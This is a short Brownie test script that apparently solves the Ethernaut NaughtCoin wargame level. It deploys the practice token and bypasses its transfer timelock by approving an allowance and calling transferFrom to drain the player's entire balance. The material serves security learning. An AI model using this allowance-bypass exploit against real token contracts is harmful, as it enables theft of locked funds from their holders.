from brownie import accounts
from scripts.helpful_scripts import get_account
from scripts.deploy import deploy_naughtcoin

def test_naughtcoin():
    account = get_account()

    naughtcoin = deploy_naughtcoin()
    assert naughtcoin.player() == account.address
    assert naughtcoin.balanceOf(account.address) == 1000000000000000000000000

    # Attacking the naughcoin.
    # Call the approve naughtcoin. Give permission to our owner to withdraw money
    naughtcoin.approve(naughtcoin.player(), 1000000000000000000000000, {"from": account})
    assert naughtcoin.allowance(naughtcoin.player(), naughtcoin.player()) == 1000000000000000000000000

    # call the transferFrom and extract all money
    naughtcoin.transferFrom(naughtcoin.player(), accounts[1], 1000000000000000000000000, {"from": account})
    assert naughtcoin.balanceOf(account.address) == 0